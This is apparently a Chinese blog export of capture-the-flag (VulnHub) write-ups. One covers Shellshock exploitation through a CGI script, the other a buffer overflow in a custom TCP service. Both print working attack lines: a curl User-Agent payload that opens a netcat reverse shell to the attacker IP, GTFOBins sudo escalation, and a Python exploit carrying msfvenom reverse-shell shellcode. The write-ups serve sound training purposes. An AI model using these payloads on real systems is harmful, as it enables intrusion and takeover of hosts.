<p>CGI即通用网关接口。通用指的是不受语言限制，理论来说，所有支持标准输出、支持获取环境变量的编程语言都能够编写CGI程序。</p>
<p>而网关，可以称之为“翻译官”，网关的输入与输出通常是两种不同的协议。比如，一个企业的一台服务器，它的一端连接HTTP协议，另一发可能连接着其他协议，比如企业内部使用的协议。CGI的功能也是如此，通常将CGI部署到Web服务器上，然后由Web服务器调用CGI程序。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412145628.png" /></p>
<p><strong>接口</strong>，确切而言是“接口协议”。所谓协议，是通信双方或多方都共识并遵守的一套规则。</p>
<p>其实不管是TCP/IP或是HTTP，都可以统称为“网络协议”，粗浅一点理解就是“<strong>描述报文内容详细语义的协议</strong>”。而“接口协议”却不然，他不会定义哪些字节该写什么，也不会定义字符的内容规范。CGI其实是构架在HTTP协议之上的。它描述的是<strong>另一个维度的共识标准</strong>。</p>
<center>
输入
</center>
<p>Web服务器调用某个cgi程序，首先把HTTP请求中的信息以环境变量的方式写入OS，然后CGI程序通过语言库函数来获取环境变量从而获得数据的输入。除此之外，还可以通过标准输入获得数据，比如POST请求调用cgi程序时，cgi程序就会通过标准输入获得body中的数据。</p>
<p>总结：</p>
<ol type="1">
<li>如果不经过HTTP请求，那么cgi程序获得整个OS的环境变量；</li>
<li>如果经过HTTP请求，那么cgi程序除了获得整个OS的环境变量之外，还会额外获得HTTP头部信息；</li>
</ol>
<center>
输出
</center>
<p>CGI通过标注输出写数据，需要注意的是，此时CGI承担HTTP协议的响应部分，因此需要将HTTP响应头部也要通过标准输出打印。</p>
<h1 id="破壳漏洞">破壳漏洞</h1>
<h2 id="概述">概述</h2>
<p>Bash 4.3以及之前的版本在处理某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行任意的shell命令,甚至完全控制目标系统。</p>
<h2 id="前置技术">前置技术</h2>
<p>参考链接：https://www.freebuf.com/articles/system/279713.html</p>
<h3 id="bash基础">bash基础</h3>
<p>在bash中，可以自定义变量，如下</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412150632.png" /></p>
<p>但是定义的这个变量只是局部的，如果用当前的bash从新开启一个子进程，则无法输出</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412150720.png" /></p>
<p>那么如何才能让子进程或者其他进程也能够访问该变量呢？答案就是将该变量设置为环境变量，因为环境变量是全局变量。可以通过<code>export</code>命令添加全局变量</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412150859.png" /></p>
<p>在bash中还可以定义shell函数并将其导出为环境变量，只要加上参数<code>-f</code>即可。如果不将函数设置为全局变量，那么子进程同样无法使用，如下</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412151157.png" /></p>
<p>将函数导入全局变量之后</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412151245.png" /></p>
<p>bash中还可以<strong>通过环境变量来定义函数</strong>。当某个环境变量的值以字符串<code>()&#123;</code>的格式作为开头，那么该变量就会被当前的bash当作一个导出函数，该函数仅在当前bash的子进程生效。（版本较高的bash则不能这么做，因此我利用<a href="https://github.com/vulhub/vulhub/blob/master/bash/CVE-2014-6271/README.zh-cn.md">vulhub/bash/shellshock</a>做测试）</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412193956.png" /></p>
<h2 id="影响的版本">影响的版本</h2>
<p>bash version &lt;= 4.3</p>
<h2 id="漏洞复现">漏洞复现</h2>
<p><a href="https://hdfzzf.icu/2022/04/12/%E5%A4%8D%E7%8E%B0%EF%BC%9ABash%20Shellshock%20%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2014-6271%EF%BC%89/">复现：Bash Shellshock 破壳漏洞（CVE-2014-6271)</a></p>
<h2 id="利用分析">利用分析</h2>
<p><strong>漏洞原理</strong>：</p>
<p>Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以<code>()&#123;</code>开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在<strong>输入的过滤中没有严格限制边界，也没有做出合法化的参数判断</strong>。</p>
<p><strong>接下来才是漏洞产生的重点：</strong></p>
<p>如果我们导入如下的字符串为全局变量： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> func=<span class="string">&#x27;() &#123; echo &quot;hello world!&quot;; &#125;; cat /etc/passwd;&#x27;</span></span><br></pre></td></tr></table></figure></p>
<p>那么在当前进程下<code>func</code>不会被执行。而一旦启动子进程<code>bash</code>，则会立即执行<code>cat /etc/passwd</code>，如下</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412194456.png" /></p>
<p>并且此时<code>func</code>也会被当作函数执行。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412194527.png" /></p>
<p>这是因为子进程<code>bash</code>在加载环境变量时首先将<code>func</code>函数当作环境变量，然后继续加载后面的<code>cat /etc/passwd</code>，此时因为还处在shell中，会将这串字符串当作shell命令执行。因此一旦启动子进程<code>bash</code>，就会立即执行这串代码。</p>
<p>所以该漏洞需要以下条件： 1. 被攻击的bash存在漏洞（版本小于等于4.3） 2. 攻击者可以控制环境变量 3. 新的bash进程被打开触发漏洞并执行命令</p>
<p>当 CGI 脚本接收到一次 HTTP 请求 , 它的环境变量就会新增一些条目 , 比如 User-Agent , Connection 等信息。因此 , 在给出的 POC 中 , 我们通过修改 User-Agent 来修改 CGI 环境变量 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">() &#123; :; &#125;; echo; command;</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>中间那个<code>:</code>可以用其他字符代替，一定要有字符！ 中间那个<code>echo</code> 不能省略。HTTP头部信息每一行都是独立的信息，这里的echo就充当换行符。（不是很能理解这里的意思）</p>
</blockquote>
<h2 id="利用场景">利用场景</h2>
<ul>
<li><p>程序在某一时刻使用 bash 作为脚本解释器处理环境变量赋值</p></li>
<li><p>环境变量的赋值字符串来源于用户输入 , 且没有通过有效的过滤</p></li>
</ul>
<h1 id="渗透">渗透</h1>
<p>kali：10.0.2.4</p>
<h2 id="主机发现端口扫描端口服务发现">主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.13</span><br><span class="line">sudo nmap -p21,22,80 -sV 10.0.2.13</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412143045.png" /></p>
<ul>
<li>21端口的服务为ftp</li>
<li>22端口的服务为ssh</li>
<li>80端口的服务为http，apache2.4.38</li>
<li>靶机操作系统为debian</li>
</ul>
<h2 id="访问http服务">访问http服务</h2>
<p>页面是一个登陆界面，尝试了一下弱口令，发现没有用。又去看了源码，没有什么有用的新，然后依次又查看了<code>HOME, NEWS, CONCAT, ABOUT US</code>发现都没有什么有用的信息。不过<code>CONCAT</code>下面有许多个人信息，可以尝试一下账号和密码是否与这有关。</p>
<p>接着进行路径发现。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.13</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412143520.png" /></p>
<p>先查看一下<code>README.md</code>，在里面发现了这个网站是用一个开源的框架搭建的，并且还给出了地址 https://github.com/zakee94/online-banking-system</p>
<p>访问网站，找到了下面这句话： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">However some important usernames and passwords are provided below :</span><br><span class="line">Username of admin is &quot;admin&quot; &amp; password is &quot;password123&quot;.</span><br><span class="line">Username of most of the customers is their &quot;first_name&quot; &amp; password is their &quot;first_name&quot; followed by &quot;123&quot;.</span><br></pre></td></tr></table></figure></p>
<p>给出了admin用户的默认账号和密码，以及普通用户的默认账号和默认密码格式。</p>
<p>除此之外，还扫描出了<code>admin_login.php</code>。这很明显应该是后台登录地址。尝试刚刚获得的默认账号和密码进行登陆。发现直接登录成功了！</p>
<p>在网站进行信息收集，发现该网站存在着业务逻辑漏洞，也就是可以从后台看到所有人的账号和密码，还可以利用这些密码进行转账，因为该网站没有严格限制登陆密码和支付密码不能一致，所以现存的账号的登录密码和支付密码一致，因此可以盗用这些账号密码，然后登录，之后给自己的账号转账即可。虽然业务逻辑漏洞在打靶过程中没有什么用，但是在现实生活中是直接造成经济损失的。</p>
<h2 id="破壳漏洞get-shell">破壳漏洞get shell</h2>
<p>之前在源码中看到了<code>&lt;!-- cgi-bin --&gt;</code>这其实就是使用了CGI技术，使用该技术可能存在着一种漏洞，那就是<strong>破壳漏洞</strong>！</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.13/cgi-bin/ -f -e cgi,sh</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412152211.png" /></p>
<p>500：表示我们提交的参数在执行过程中发生了错误，但是不代表我们访问的文件不存在，反而证明文件应该是存在的。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p80 --script http-shellshock --script-args uri=/cgi-bin/shell.sh,cmd=ls 10.0.2.13</span><br><span class="line"><span class="comment"># http-shellshock 专门用来测试是否存在破壳漏洞</span></span><br><span class="line"><span class="comment"># 如果最后的命令执行成功，说明存在漏洞</span></span><br><span class="line"><span class="comment"># uri=/cgi-bin/shell.sh 要检测的文件路径</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412152316.png" /></p>
<p>发现确实存在破壳漏洞。也可以对<code>backup.cgi</code>进行测试一下。下面的代码就利用（<code>-A</code>等价于<code>-H</code>，都是指定<code>user-agent</code>）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -H <span class="string">&quot;user-agent:() &#123; :; &#125;; echo; /bin/bash -c &#x27;which nc&#x27;&quot;</span> \http://10.0.2.13/cgi-bin/shell.sh</span><br><span class="line"><span class="comment"># 如果存在nc，就可以利用nc反弹。先用-e的尝试一下，如果不可以再用nc串联</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412172426.png" /></p>
<p>此时能够百分之百确定存在破壳漏洞。接着反弹shell <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -H <span class="string">&quot;user-agent:() &#123; :; &#125;; echo; echo; /bin/bash -c &#x27;nc -e /bin/bash 10.0.2.4 4444&#x27;&quot;</span> \http://10.0.2.13/cgi-bin/shell.sh</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412154821.png" /></p>
<p>反弹成功！</p>
<h2 id="权限提升">权限提升</h2>
<p>首先查看一下sudo配置<code>sudo -l</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412155743.png" /></p>
<p>发现了奇怪的东西，我们尝试执行一下 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -u thor /home/thor/./hammer.sh</span><br></pre></td></tr></table></figure></p>
<p>然后要求我们输入，我们输入几条系统命令看一下</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412155919.png" /></p>
<p>猜测：第一个输入点，无论我们输入什么都会被返回；而第二个输入点则会执行命令。刚刚的<code>id</code>可以看出，该程序的权限是<code>thor</code>，如果该程序执行<code>bash</code>则会得到<code>thor</code>权限的bash。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160049.png" /></p>
<p>果不其然，成功得到<code>thor</code>的权限。第一个flag在<code>/home/thor/user.txt</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160245.png" /></p>
<p>然后需要想办法提权到root，再次查看sudo配置<code>sudo -l</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160315.png" /></p>
<p>这里涉及到<strong>GTFOBins提权：针对目标系统自带的应用程序配置不当导致提权</strong>，参考链接：<a href="https://gtfobins.github.io">gtfobins</a></p>
<p>网站中提到</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160423.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160429.png" /></p>
<p>因为我们需要提权到root，所以使用后者中的<code>Shell</code>的命令，也就是如下命令： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /usr/sbin/service ../../bin/bash</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160607.png" /></p>
<p>成功提权到root！接下来获取第二个flag<code>/root/root.txt</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160550.png" /></p>
<p>其实也可以通过<code>/usr/bin/cat</code>直接读取flag。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160915.png" /></p>
<p>本台靶机到此结束！</p>
<h1 id="总结">总结</h1>
<p>该靶机的难度主要在于<strong>破壳漏洞</strong>的发现以及 <strong>GTFOBins漏洞</strong>利用。练习这么多个靶机以来第一次碰到这样的漏洞以及利用方式。</p>
<p>还有一点，就是如果发现目标站点使用的是开源的框架，可以尝试以下默认的账号和密码。</p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>破壳漏洞</tag>
        <tag>开源源码泄露</tag>
        <tag>GTFOBins提权</tag>
      </tags>
  </entry>
  <entry>
    <title>12 Vulnhub HarryPotterFawkes Writeup</title>
    <url>/2022/04/16/12%20Vulnhub%20HarryPotterFawkes%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度为高，主要的难点在于缓冲区溢出漏洞的利用以及堆溢出漏洞攻击。其次在于FTP服务攻击和流量抓包分析，这两者在之前的靶机中从没遇到过。</p>
<span id="more"></span>
<h1 id="靶机信息">1 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/harrypotter-fawkes,686/">HarryPotter:Fawkes</a></li>
<li>这是一个系列的靶机，漏洞都非常的奇特！</li>
</ul>
<p>难度：</p>
<ul>
<li>高</li>
</ul>
<p>目标：</p>
<ul>
<li><p>取得2个root权限</p></li>
<li><p>拿到3个Flag</p></li>
</ul>
<p>涉及攻击方法：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>web信息收集</li>
<li><strong>FTP服务攻击</strong></li>
<li><strong>缓冲区溢出</strong></li>
<li><strong>模糊测试</strong></li>
<li>漏洞利用代码编写</li>
<li><strong>流量抓包分析</strong></li>
<li><strong>堆溢出漏洞攻击</strong></li>
<li>Metasploit（MSF）</li>
<li>手动修复EXP代码</li>
<li>本地提权</li>
</ul>
<p>参考资料：</p>
<ul>
<li><a href="https://github.com/worawit/CVE-2021-3156">CVE-2021-3156</a></li>
<li>https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit</li>
</ul>
<h1 id="渗透">2 渗透</h1>
<h2 id="主机发现端口扫描端口服务发现">2.1 主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.16</span><br><span class="line">sudo nmap -p21,22,80,2222,9898 -A 10.0.2.16</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416151956.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416152011.png" /></p>
<p>信息如下：</p>
<ul>
<li>21端口的服务是ftp，版本为vsfttpd 3.0.3，可以匿名登录，并且存在一个文件<code>server_hogwarts</code></li>
<li>22端口的服务是ssh，版本是OpenSSH 7.9，</li>
<li>80端口的服务是http，版本为Apache 2.4.38</li>
<li>2222端口的服务也是ssh，版本为OpenSSH 2.4.38</li>
<li>9898端口的服务未知，所以随便给了一个monkeycom</li>
<li>靶机的操作系统为Debian</li>
</ul>
<h2 id="访问http服务">2.2 访问http服务</h2>
<p>直接访问80端口，发现这个网页非常的刚进，只有一张图片。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416152214.png" /></p>
<p>因此尝试进行路径扫描，也没有什么有用的发现</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416152340.png" /></p>
<h2 id="访问ftp服务">2.3 访问ftp服务</h2>
<p>在http上没有有用的发现，接下来直接利用ftp匿名登录上去，并下载对应的那个文件。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ftp 10.0.2.16 21</span><br><span class="line">用户名输入：anonymous</span><br><span class="line">密码为空，直接enter</span><br></pre></td></tr></table></figure></p>
<p>登录进去之后，利用<code>get server_hogwarts</code>下载对应文件到本地，接下来我想查看一下其他目录的东西，发现除了下载对应的文件，不能进行任何操作。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416153338.png" /></p>
<h2 id="缓冲区溢出漏洞">2.4 缓冲区溢出漏洞</h2>
<p>到目前为止，http服务没信息，ssh没有用户和密码，9898都不知道什么服务，只有刚刚下载的一个文件，先查看一下文件类型</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">file server_hogwarts</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416153531.png" /></p>
<p>信息：</p>
<ul>
<li>该文件是一个二进制的可执行文件（elf是Linux的可执行文件格式），并且是32位的</li>
<li>说明对方系统是能够运行32位的软件，即<code>x86</code>架构</li>
</ul>
<p>首先执行这文件看一下会发生什么，结果是无事发生，查看进程是否存在对应的进程，发现确实存在</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416154319.png" /></p>
<p>查看其所在的端口</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416154459.png" /></p>
<p>发现开了9898端口，联想到端口扫描的时候，靶机上也开了9898端口，因此，靶机上的9898端口对应的服务应该就是这个。现在本地用nc连接上看一下该服务的功能。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416154637.png" /></p>
<p>功能非常简单，我们输入对应的字符串，服务返回对应的字符串，就一个功能点。连接靶机的9898端口，发现功能是一模一样的，接下来只能通过查看该文件是否存在缓冲区溢出漏洞来判断靶机上也存在相应的漏洞。</p>
<p>在测试之前，需要先把aslr关掉。</p>
<blockquote>
<p>该技术简单来说就是每次启用程序的时候的内存地址总是随机的，这样子即使存在缓冲区溢出漏洞，也会因为每次启动程序的地址不同导致第一次出现漏洞的地址A和第二次出现漏洞的地址B不同，使得即使存在漏洞也无法利用。</p>
</blockquote>
<p>查看是否开启：（0是禁用；1，2表示开启，2是在1的基础上进一步打开堆地址随机化）</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416155246.png" /></p>
<p>输入以下命令禁用： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo root <span class="comment"># 需要先切换到root才可以，否则权限不够</span></span><br><span class="line"><span class="built_in">echo</span> 0 &gt; <span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure></p>
<p>利用图形化工具edb-debugger进行查找。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install edb-debugger <span class="comment"># 安装</span></span><br></pre></td></tr></table></figure></p>
<h3 id="查找漏洞">2.4.1 查找漏洞</h3>
<p>生成一个300个A的字符串，然后输入到唯一的功能点中，发现edb-debugger提示出错了</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416155927.png" /></p>
<p>说明这里确实存在漏洞，接下来生成不重复的字符串判断一下是哪几个A出现在了EIP寄存器中。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf-pattern_create -l 300</span><br><span class="line"></span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416160325.png" /></p>
<p>此时EIP中的值为<code>64413764</code>，即<code>d7Ad</code>（注意需要反过来），然后查找该子串在原来字符串中的偏移量 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf-pattern_offset</span><br><span class="line"></span><br><span class="line">Exact match at offset 112</span><br></pre></td></tr></table></figure></p>
<p>生成字符串确定一下： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;print(&#x27;A&#x27;*112 + &#x27;hdfs&#x27; + &#x27;C&#x27;*50)&quot;</span></span><br><span class="line"></span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAhdfsCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416162156.png" /></p>
<p>成功找到漏洞所在。那么该如何利用呢？这里不像之前，不存在有漏洞的函数可以利用。首先得知道一个基础知识：</p>
<blockquote>
<ol type="1">
<li>EIP寄存器里存储的是CPU下次要执行的指令的地址；</li>
<li>EBP：栈指针寄存器(extended stack pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶。</li>
<li>ESP：基址指针寄存器(extended base pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的底部。</li>
</ol>
</blockquote>
<p>（我对汇编不熟悉）简单说下我的理解：如果存在漏洞的函数，可以将EIP中的值修改为对应函数的地址，然后CPU就会自动执行存在漏洞的函数。像该靶机，不存在漏洞函数，可以通过EIP让CPU执行ESP寄存器中的指令，即<code>jmp esp</code>指令。我们提前在ESP中写入反弹shell的指令（可以用msf生成）。</p>
<h3 id="利用漏洞">2.4.2 利用漏洞</h3>
<p>从查找漏洞的过程来看，ESP寄存器是可写入的，并且会将EIP之后的内容（即hdfs之后的内容）全部写入ESP。因此，我们先利用msf生成反弹shell的指令： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.2.4 LPORT=4444 -b <span class="string">&quot;\x00&quot;</span> -f py <span class="comment"># 生成python可利用的</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416163915.png" /></p>
<p>然后查找<code>jmp esp</code>指令的地址，利用<code>Plugins-&gt;Opcode Search</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416164843.png" /></p>
<p>要找到可执行权限的进程，然后<code>ESP-&gt;EIP</code>（个人理解：将ESP指令传给EIP）</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416164946.png" /></p>
<p>记住地址，写入payload的时候记得反过来！</p>
<p>然后编写利用脚本： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> sys,socket</span><br><span class="line">buf =  <span class="string">b&quot;&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xbb\x77\x58\x1b\xb6\xda\xc6\xd9\x74\x24\xf4\x5a\x2b&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xc9\xb1\x12\x31\x5a\x12\x03\x5a\x12\x83\xb5\x5c\xf9&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x43\x08\x86\x0a\x48\x39\x7b\xa6\xe5\xbf\xf2\xa9\x4a&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xd9\xc9\xaa\x38\x7c\x62\x95\xf3\xfe\xcb\x93\xf2\x96&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xc1\x63\x07\x62\xbe\x61\x07\x7b\x62\xef\xe6\xcb\xfc&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xbf\xb9\x78\xb2\x43\xb3\x9f\x79\xc3\x91\x37\xec\xeb&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x66\xaf\x98\xdc\xa7\x4d\x30\xaa\x5b\xc3\x91\x25\x7a&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x53\x1e\xfb\xfd&quot;</span></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">112</span> + <span class="string">&#x27;\x55\x9d\x04\x08&#x27;</span> + <span class="string">&#x27;\x90&#x27;</span>*<span class="number">32</span>  + buf</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    s.connect((<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">9898</span>))</span><br><span class="line">    s.send((payload))</span><br><span class="line">    s.close()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;something wrong!&#x27;</span>)</span><br><span class="line">    sys.exit()</span><br></pre></td></tr></table></figure></p>
<p>解释：</p>
<ul>
<li>最开始的<code>#! /usr/bin/python</code>：当我们输入<code>./exp.py</code>时，默认最开始<code>#!</code>中的执行；</li>
<li><code>'\x90'*32*</code>：<code>\x90</code>空，读到该字节就会继续读取下一个。这是一个技巧，使程序更稳定。如果代码的字节很紧凑，可能执行过程不会按照预期，适当的插入null不会影响执行过程，反而能够使程序的运行更加稳定。</li>
<li>不能用python3，否则会因为payload中既有字节又有字符而报错！</li>
</ul>
<p>接着：</p>
<ol type="1">
<li>启动服务</li>
<li>监听4444端口</li>
<li>执行该程序<code>./exp.py</code>或者<code>python exp.py</code>都可以，不过一定要确保服务开启</li>
</ol>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416170120.png" /></p>
<p>接下来修改脚本，将IP地址改为<code>10.0.2.16</code>即可，然后执行该脚本，讲道理就能够获得靶机的shell。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416170549.png" /></p>
<h2 id="信息收集">2.5 信息收集</h2>
<p>输入<code>/bin/sh -i</code>拿到可用的shell。要加`-i。</p>
<p>当我发现该shell的IP时察觉到不对劲</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416170810.png" /></p>
<p>靶机的IP应该是<code>10.0.2.16</code>而不是<code>172.....</code>，并且网卡的名字也很奇怪，怀疑这可能是一个容器，查看根目录下的文件</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416171405.png" /></p>
<p>确定了我们现在的shell是一个容器的shell。不管它，反正先收集信息就对了。</p>
<p>首先，在当前目录下发现了一个可能是重要的文件<code>.mycreds.txt</code>，查看其内容： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HarrYp0tter@Hogwarts123</span><br></pre></td></tr></table></figure></p>
<p>这看起来像是一个密码，不管三七二十一，先尝试一下ssh登录，两个端口的ssh都尝试一下，发现2222端口的登录成功了 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh harry@10.0.2.16 -p 2222</span><br></pre></td></tr></table></figure></p>
<p>发现还是在容器内🤡，查看一下root目录里面的内容，发现了两个文件，内容分别为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// note.txt</span><br><span class="line">Hello Admin!!</span><br><span class="line"></span><br><span class="line">We have found that someone is trying to login to our ftp server by mistake.You are requested to analyze the traffic and figure out the user.</span><br><span class="line"></span><br><span class="line">// horcrux1.txt # 这就是第一个flag，horcrux是哈利波特里面的魂器的意思</span><br><span class="line">horcrux_&#123;NjogSGFSclkgUG90VGVyIGRFc1RyT3llZCBieSB2b2xEZU1vclQ=&#125;</span><br></pre></td></tr></table></figure></p>
<p>base64解码：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416173101.png" /></p>
<p>需要关注的是<code>note.txt</code>中的内容，大致的意思是：有人尝试登录ftp服务器，但是出错了，要求我们用流量分析的方法找到那人是谁。</p>
